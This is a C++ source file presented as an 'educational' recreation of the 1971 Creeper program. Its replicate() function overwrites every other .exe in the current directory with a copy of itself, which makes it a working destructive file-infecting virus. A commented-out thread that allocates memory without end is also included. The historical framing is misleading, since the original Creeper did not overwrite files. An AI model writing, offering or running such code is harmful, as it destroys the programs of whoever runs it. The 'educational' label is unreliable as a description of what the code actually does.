/*
 * Creeper (1971) - Educational self-replicating program
 * Bob Thomas / BBN - First virus concept
 *
 * Compile (MinGW): g++ creeper.cpp -o creeper.exe
 *
 * OOP approach: CreeperEngine class encapsulates replication logic
 * Memory duplicator via thread-spawning simulation
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>

namespace fs = std::filesystem;

class CreeperEngine {
private:
    std::string self_path;
    std::vector<std::string> infected_log;
    int count;

    bool is_exe(const fs::path &p) {
        return p.extension() == ".exe";
    }

public:
    CreeperEngine() : count(0) {
        char buf[MAX_PATH];
        GetModuleFileNameA(NULL, buf, MAX_PATH);
        self_path = buf;
    }

    int replicate() {
        std::ifstream self(self_path, std::ios::binary);
        if (!self) return 0;

        std::vector<unsigned char> data(
            (std::istreambuf_iterator<char>(self)),
            std::istreambuf_iterator<char>()
        );
        self.close();

        for (auto &entry : fs::directory_iterator(fs::current_path())) {
            if (!entry.is_regular_file()) continue;

            fs::path target = entry.path();
            if (target.filename() == fs::path(self_path).filename()) continue;
            if (!is_exe(target)) continue;

            std::ofstream out(target, std::ios::binary);
            if (out) {
                out.write(reinterpret_cast<char*>(data.data()), data.size());
                out.close();
                std::cout << "[creep] infected: " << target.filename() << std::endl;
                infected_log.push_back(target.string());
                count++;
            }
        }

        // Memory duplicator: anonymous pages
        for (int i = 0; i < 4; i++) {
            VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
        }

        return count;
    }

    void show_infections() const {
        std::cout << "[creep] infections: " << count << " file(s)" << std::endl;
    }
};

// Thread-based memory duplication simulation
DWORD WINAPI memory_duplicator(LPVOID) {
    while (true) {
        VirtualAlloc(NULL, 8192, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        Sleep(100);
    }
    return 0;
}

int main() {
    std::cout << "I'M THE CREEPER: CATCH ME IF YOU CAN." << std::endl;

    CreeperEngine creeper;
    creeper.replicate();
    creeper.show_infections();

    // Spawn thread to simulate memory duplication (limits itself)
    // HANDLE hThread = CreateThread(NULL, 0, memory_duplicator, NULL, 0, NULL);
    // CloseHandle(hThread);

    std::cout << "[creep] use antivirus to remove me" << std::endl;
    return 0;
}
